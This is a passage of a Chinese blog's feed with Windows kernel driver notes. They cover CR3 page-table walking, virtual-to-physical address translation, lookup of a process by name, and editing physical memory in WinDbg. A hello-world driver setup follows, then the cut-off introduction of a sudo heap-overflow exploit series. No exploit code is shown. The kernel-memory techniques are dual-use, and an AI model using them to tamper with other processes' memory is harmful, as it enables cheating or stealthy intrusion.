id="驱动开发探索页面"><a class="markdownIt-Anchor" href="#驱动开发探索页面"></a> [驱动开发]探索页面</h2><h3 id="cr3寄存器于页遍历"><a class="markdownIt-Anchor" href="#cr3寄存器于页遍历"></a> CR3寄存器于页遍历</h3><p>CR3 寄存器设计 <code>CR3[512][512][512][512]</code></p><p><img src="https://img.joe1sn.top/uploads/big/232aa1382631d6a7942c76e6deb33f7c.png" alt="image-20230217100658871" /></p><p>个人觉得这块儿和CSAPP上面讲的差不多</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>页号</mtext><mo>=</mo><mfrac><mtext>页首地址</mtext><mtext>页大小</mtext></mfrac><mo>=</mo><mfrac><mtext>页首地址</mtext><mrow><mn>4</mn><mi>K</mi><mi>B</mi></mrow></mfrac><mo>=</mo><mo>=</mo><mfrac><mtext>页首地址</mtext><msup><mn>2</mn><mn>12</mn></msup></mfrac><mo>=</mo><mo>=</mo><mtext>页首地址</mtext><mo>&gt;</mo><mo>&gt;</mo><mn>12</mn></mrow><annotation encoding="application/x-tex">页号 = \frac{页首地址}{页大小}= \frac{页首地址}{4KB}== \frac{页首地址}{2^{12}}== 页首地址&gt;&gt;12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">号</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">页</span><span class="mord cjk_fallback mtight">大</span><span class="mord cjk_fallback mtight">小</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">页</span><span class="mord cjk_fallback mtight">首</span><span class="mord cjk_fallback mtight">地</span><span class="mord cjk_fallback mtight">址</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">页</span><span class="mord cjk_fallback mtight">首</span><span class="mord cjk_fallback mtight">地</span><span class="mord cjk_fallback mtight">址</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">页</span><span class="mord cjk_fallback mtight">首</span><span class="mord cjk_fallback mtight">地</span><span class="mord cjk_fallback mtight">址</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">2</span></span></span></span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.得到CR3寄存器的值，从而得到一级页表地址</span></span><br><span class="line">CR3 Cr3 = &#123; .Value = __readcr3() &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.对每一个一级页读取</span></span><br><span class="line">PL1PTE L1pt = MmGetVirtualForPhysical(L1ptPa.AsLargeInteger);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> n1 = <span class="number">0</span>; n1 &lt; <span class="number">512</span>; n1++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!L1pt[n1].Fields.P || !L1pt[n1].Fields.U_S) <span class="keyword">continue</span>;</span><br><span class="line">        PA L2ptPa = &#123; .Fields4KB.PPN = L1pt[n1].Fields.PPN &#125;;</span><br><span class="line">        DbgPrint(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">    <span class="comment">//3.得到二级页表地址</span></span><br><span class="line">        PL2PTE L2pt = MmGetVirtualForPhysical(L2ptPa.AsLargeInteger);</span><br><span class="line">    <span class="comment">//4.类似嵌套循环，遍历</span></span><br></pre></td></tr></table></figure><ol><li><p><code>CR3</code>的<code>PPN</code>是第12位，共40bit，所以一级页表是这个值。<code>CR3</code>的尾12位没有用全为0，同时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>4</mn></msup><mo>=</mo><mn>16</mn></mrow><annotation encoding="application/x-tex">2^{4} = 16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span></span></span></span>，那么向右移12位等效于16禁止右移<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>12</mn><mn>4</mn></mfrac><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">\frac{12}{4}=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>位</p></li><li><p>得到<code>Level_1_PageTable</code>的值过后，可以使用函数<code>MmGetVirtualForPhysical</code>获得该内存地址的值，从而遍历一级页表。要判断当前<code>L1pt.P</code>是否有效，同时<code>L1pt.U_S</code>可以判断该页的权限，详细可以看开发者手册 <code>Table 4-20</code></p><p><img src="https://img.joe1sn.top/uploads/big/fd903a2be055b9552c224180031c3356.png" alt="image-20230217140249814" /></p></li><li><p>依次循环可以遍历完整个内存页（下图中L4pt放不下了）</p></li></ol><p><img src="https://img.joe1sn.top/uploads/big/2fde29bb895532a0e3dbe6caf96b39ab.png" alt="image-20230217134809379" /></p><h3 id="虚拟地址-物理地址"><a class="markdownIt-Anchor" href="#虚拟地址-物理地址"></a> 虚拟地址-&gt;物理地址</h3><p>程序按照4KB分页个数太多不利于实验，可以强制将其分页为1GB，这样便于翻译</p><p><img src="https://img.joe1sn.top/uploads/big/5a04f7c630f2039a36b284c729accfa3.png" alt="image-20230217140941496" /></p><p>编写一个测试程序，该程序能申请出一页的内存，并打印其值</p><p>使用<code>PsGetCurrentProcess</code>获得当前进程<code>PROCESS</code>对象，若相等则不启用新方法</p><p>使用<code>KeStackAttachProcess</code>附加到要翻译的内存的<code>PROCESS</code>对象中，使用老方法输出就OK了，最后<code>KeUnstackDetachProcess</code>脱离</p><ul><li><p>?如何使用按照名字查找进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;win10.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">QuerySystemInformation</span><span class="params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID* SystemInformation)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    PVOID Buffer;</span><br><span class="line">    ULONG BufferSize = <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, <span class="string">&#x27;bisQ&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!Buffer) <span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line"></span><br><span class="line">        Status = NtQuerySystemInformation(SystemInformationClass, Buffer, BufferSize, &amp;BufferSize);</span><br><span class="line">        <span class="keyword">if</span> (NT_SUCCESS(Status)) &#123;</span><br><span class="line">            *SystemInformation = Buffer;</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ExFreePool(Buffer);</span><br><span class="line">        <span class="keyword">if</span> (STATUS_INFO_LENGTH_MISMATCH != Status) <span class="keyword">return</span> Status;</span><br><span class="line">    &#125; <span class="keyword">while</span> (TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">LookUpProcessByImageName</span><span class="params">(PCWSTR ImageName, PEPROCESS* Process)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION ProcessInformationArray = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    Status = QuerySystemInformation(SystemProcessInformation, &amp;ProcessInformationArray);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(Status)) <span class="keyword">return</span> Status;</span><br><span class="line"></span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION CurrentInformation = ProcessInformationArray;</span><br><span class="line">    UNICODE_STRING ImageNameUnicodeString;</span><br><span class="line">    RtlInitUnicodeString(&amp;ImageNameUnicodeString, ImageName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (RtlCompareUnicodeString(&amp;CurrentInformation-&gt;ImageName, &amp;ImageNameUnicodeString, FALSE) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Status = PsLookupProcessByProcessId(CurrentInformation-&gt;UniqueProcessId, Process);</span><br><span class="line">            ExFreePool(ProcessInformationArray);</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (CurrentInformation-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ExFreePool(ProcessInformationArray);</span><br><span class="line">            <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        CurrentInformation = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)CurrentInformation + CurrentInformation-&gt;NextEntryOffset);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大致思路和win32下按名称查找PID差不多</p></li><li><p>具体过程</p><p><img src="https://img.joe1sn.top/uploads/big/0fdab9499f3cf26c73a14209daa70aaa.png" alt="image-20230217144908513" /></p><p>这里以<code>0x00000254000003BC  Str1</code> 为例子，加载插件打印，耐心等待。。。</p><p><img src="https://img.joe1sn.top/uploads/big/7d498b364278092281843a4f1d83dab3.png" alt="image-20230217145848060" /></p><p>这时候的数据大小就有83KB了</p><p><code>format(0x00000254000003BC, &quot;064b&quot;)</code>，内存前16位为空是没有用的</p><ul><li><p>高9位 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mi>P</mi><mi>N</mi><mn>1</mn><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">VPN1=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span></p><p><code>int(format(0x00000254000003BC, &quot;064b&quot;)[16:][:9],2)</code></p><p><img src="https://img.joe1sn.top/uploads/big/4637e86e487404ab026afbbc26328816.png" alt="image-20230217150603957" /></p></li><li><p>再9位 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mi>P</mi><mi>N</mi><mn>2</mn><mo>=</mo><mn>336</mn></mrow><annotation encoding="application/x-tex">VPN2=336</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">3</span><span class="mord">6</span></span></span></span></p><p><code>int(format(0x00000254000003BC, &quot;064b&quot;)[16:][9:18],2)</code></p><p><img src="https://img.joe1sn.top/uploads/big/5bda92c2a7cdbea9c04507263f971258.png" alt="image-20230217150709452" /></p><p><strong>该页表的PS=1，则不需要查找下一个页表了</strong>（而且后面也没有了）</p></li><li><p>得到的<code>Pa</code>就是物理页的首地址 + 剩余的30bit位作为<code>VPO</code> = 物理地址</p><p><code>hex(0x00000001C0000000+int(format(0x00000254000003BC, &quot;064b&quot;)[16:][18:],2))</code></p><p>得到<code>PA+VPO = 0x1c00003bc</code></p></li><li><p>暂停系统，Windbg -&gt; memory window -&gt; 右键 -&gt; proeries -&gt; physical memory</p><p><img src="https://img.joe1sn.top/uploads/big/5a6dddfa643cdd1d03c716121b4de8f3.png" alt="image-20230217151350113" /></p></li><li><p>尝试修改</p><p><img src="https://img.joe1sn.top/uploads/big/a1166647d16ba21f913e126ca6ea3592.png" alt="image-20230217151439604" /></p><p>再次刷新应该就是<code>1234</code>了</p><p><img src="https://img.joe1sn.top/uploads/big/656aff6ff9e27f5686dfeac7868602d2.png" alt="image-20230217151554657" /></p><p>成功修改</p></li></ul></li></ul><h3 id="官方文档"><a class="markdownIt-Anchor" href="#官方文档"></a> 官方文档</h3><p>2938/4834</p><p><img src="https://img.joe1sn.top/uploads/big/068eed44fe76c0448ad99c95bb66a87d.png" alt="image-20230217151657940" /></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;驱动开发-2&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#驱动开发-2&quot;&gt;&lt;/a&gt; [驱动开发] 2&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;探索CR4&lt;/li&gt;
&lt;li&gt;探索页面
&lt;ul&gt;
&lt;li&gt;CR3寄存器于页遍历&lt;/li&gt;
&lt;li&gt;虚拟地址-&amp;gt;物理地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 1-环境搭建</title>
    <link href="https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/"/>
    <id>https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/</id>
    <published>2023-02-16T04:07:43.000Z</published>
    <updated>2023-02-17T07:36:47.386Z</updated>
    
    <content type="html"><![CDATA[<h1 id="驱动开发-1-环境搭建"><a class="markdownIt-Anchor" href="#驱动开发-1-环境搭建"></a> [驱动开发] 1-环境搭建</h1><p>简而言之就是</p><ul><li>visual stdio 2019</li><li>windows SDK</li><li>windows WDK</li></ul><p>如果vs没有kernel的项目的模板，找到vs目录的<code>WDK.vsix</code>即可</p><span id="more"></span><h2 id="关于调试"><a class="markdownIt-Anchor" href="#关于调试"></a> 关于调试</h2><p><strong>windbg调试器</strong></p><p>同时windows 虚拟机我使用的是 vmware，添加了一个COM串口</p><p><img src="https://img.joe1sn.top/uploads/big/0e5e407e61b2787fe8d174ee78d786f9.png" alt="img" /></p><p><strong>加载驱动</strong></p><p>使用KmdKit</p><p><strong>windows设置</strong></p><p>msconfig -&gt; 调试 -&gt; COM2 …</p><h2 id="最简单的hello-world"><a class="markdownIt-Anchor" href="#最简单的hello-world"></a> 最简单的hello world</h2><ol><li><p>打开vs，找到KMDF （kernel mode driver empty）</p><p><img src="https://img.joe1sn.top/uploads/big/5a72026aeb132a80141459930266ff2f.png" alt="image-20230216094535591" /></p><p><img src="https://img.joe1sn.top/uploads/big/4a2157b5a902cc4e683bc515976a6dd1.png" alt="image-20230216094619479" /></p></li><li><p>设置驱动项目</p><ul><li><p>取消晚上12点后编译报错</p><p>项目 -&gt; 属性 -&gt; Inf2Cat -&gt; Use Local Time</p></li></ul></li><li><p>代码</p><p><code>main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动卸载函数</span></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(DriverObject);</span><br><span class="line">    DbgPrint(<span class="string">&quot;Bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动入口函数</span></span><br><span class="line"><span class="comment">// System 在内核模式下运行该函数</span></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(RegistryPath);           <span class="comment">//宏防止编译器报错</span></span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Hello World!\n&quot;</span>);                     <span class="comment">//调式输出</span></span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;      <span class="comment">//驱动卸载函数</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;                          <span class="comment">//加载成功返回码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><img src="https://img.joe1sn.top/uploads/big/1d83cc90f91bf254d6db9b7ebbb481a0.png" alt="image-20230216100806109" /></p><p>Class改为 <code>Class=System</code></p><p>ClassInstall32 直接删除两行（就是直接把这个属性删除了）</p><p><img src="https://img.joe1sn.top/uploads/big/03841eddfb57574b75091bd1cd33e806.png" alt="image-20230216101548006" /></p></li><li><p><img src="https://img.joe1sn.top/uploads/big/dc2201764709db7119f6a7b519ac3903.png" alt="image-20230216101554206" /></p><p><img src="https://img.joe1sn.top/uploads/big/c1226951b6d0f3621876333579bb6eb6.png" alt="image-20230216101730183" /></p></li></ul></li><li><p>使用加载器加载</p><ul><li><p>使用KmdManager<img src="https://img.joe1sn.top/uploads/big/0d7768677a0c2e464e7199833004c5e1.png" alt="image-20230216104456039" /></p></li><li><p>使用windbg x64调试</p><p>File -&gt; Kernel Debug</p><p><img src="https://img.joe1sn.top/uploads/big/b55178c253d85e3757e50bf0bb23f14b.png" alt="image-20230216104653478" /></p><p><img src="https://img.joe1sn.top/uploads/big/aecd2c15dc88ad68383aa36767e1ad3b.png" alt="image-20230216112506954" /></p></li></ul></li><li><p>F5继续过后在虚拟机里面运行</p><p><img src="https://img.joe1sn.top/uploads/big/494b5e56c09367a539769d132fb94105.png" alt="image-20230216115613845" /></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;驱动开发-1-环境搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#驱动开发-1-环境搭建&quot;&gt;&lt;/a&gt; [驱动开发] 1-环境搭建&lt;/h1&gt;
&lt;p&gt;简而言之就是&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;visual stdio 2019&lt;/li&gt;
&lt;li&gt;windows SDK&lt;/li&gt;
&lt;li&gt;windows WDK&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果vs没有kernel的项目的模板，找到vs目录的&lt;code&gt;WDK.vsix&lt;/code&gt;即可&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>SUDO堆溢出提权：从fuzz到exp [3]</title>
    <link href="https://joe1sn.eu.org/2022/04/14/sudo-fuzz2exp-3/"/>
    <id>https://joe1sn.eu.org/2022/04/14/sudo-fuzz2exp-3/</id>
    <published>2022-04-13T23:40:53.000Z</published>
    <updated>2022-09-20T08:04:55.198Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sudo堆溢出提权从fuzz到exp-3"><a class="markdownIt-Anchor" href="#sudo堆溢出提权从fuzz到exp-3"></a> SUDO堆溢出提权：从fuzz到exp [3]</h1><blockquote><p>前文：<a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p><p>受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程</p><p>原始视频合集：<a href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p><p>原始Blog：<a href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p><p>原作者代码仓库：<a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p></blockquote><span id="more"></span><blockquote><p>My previous blog: <a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p><p>I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series.</p><p>Original Videos: <a href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p><p>Original Blog: <a href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p><p>Source Project Code: <a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p></blockquote><hr /><blockquote><p>本节内容：</p><p>Discussing Heap Exploit Strategies for sudo - Ep. 09</p><p>Developing a Tool to Find Function Pointers on The 